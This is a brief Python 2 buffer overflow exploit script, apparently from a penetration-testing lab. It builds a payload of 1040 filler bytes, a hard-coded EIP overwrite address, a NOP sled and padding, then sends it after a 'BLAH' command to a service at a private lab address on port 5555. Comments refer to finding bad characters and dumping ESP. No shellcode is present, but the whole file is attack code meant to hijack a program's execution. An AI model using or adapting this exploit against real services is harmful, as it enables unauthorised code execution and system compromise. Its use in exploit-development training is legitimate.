#!/usr/bin/python
import socket

offset   = "A"*1040
eip      = "\x71\x1D\xD1\x65"
extranop = "\x90"*16 #extra space for shellcode decoding
padding  = "C"*(1420-1040-4-16) # total size off data send - variables 


#buffer = "A"*2606 + "\x8f\x35\x4a\x5f"  +"C"*(3500-2606-4)
buffer = offset + eip + padding  #A=Offset B=EIP BADCHARSstring Dump memmory of ESP after crash C=Sie buffer






s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('10.11.22.89',5555))
s.recv(1024)
s.send('BLAH ' + buffer + '\r\n')
s.send('QUIT\r\n')
print s.recv(1024)
s.close()
